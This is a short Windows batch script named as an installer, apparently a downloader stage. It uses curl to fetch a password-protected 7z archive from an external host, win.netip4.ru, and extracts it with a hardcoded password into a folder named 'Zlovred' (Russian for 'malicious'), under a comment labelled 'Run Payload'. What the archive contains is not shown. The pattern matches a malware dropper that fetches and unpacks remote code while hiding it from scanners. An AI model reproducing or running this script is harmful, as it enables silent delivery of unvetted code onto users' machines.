@echo off
rem *******************************************************
rem MikhailMatfey.install.bat
rem *******************************************************
@echo off

rem Set Variables

rem Set Path
set ZLOVREDDIR=C:\pub1\Distrib\Zlovred

if not exist %ZLOVREDDIR% echo Error %ZLOVREDDIR% is missing && exit /b 1

set CURLEXE=%ZLOVREDDIR%\curl.exe
set a7ZAEXE=%ZLOVREDDIR%\7za.exe
if not exist %CURLEXE% echo Error %CURLEXE% is missing && exit /b 1
if not exist %a7ZAEXE% echo Error %a7ZAEXE% is missing && exit /b 1

set FileName=MikhailMatfey.7z
set host=http://win.netip4.ru/Apps/smbshare/NIT/atHost/Scripts/DownloadFile.ashx?file=
set LocalPath=%ZLOVREDDIR%\%FileName%
set PASS=szbeck

rem Run Payload

if exist %LocalPath% del %LocalPath% /Q /F
%CURLEXE% -o %LocalPath% %host%%FileName%
%a7ZAEXE% x -aoa -p%PASS% -o%ZLOVREDDIR% %LocalPath%
if exist %LocalPath% del %LocalPath% /Q /F

:End
echo Success script %0 run
exit /b 0
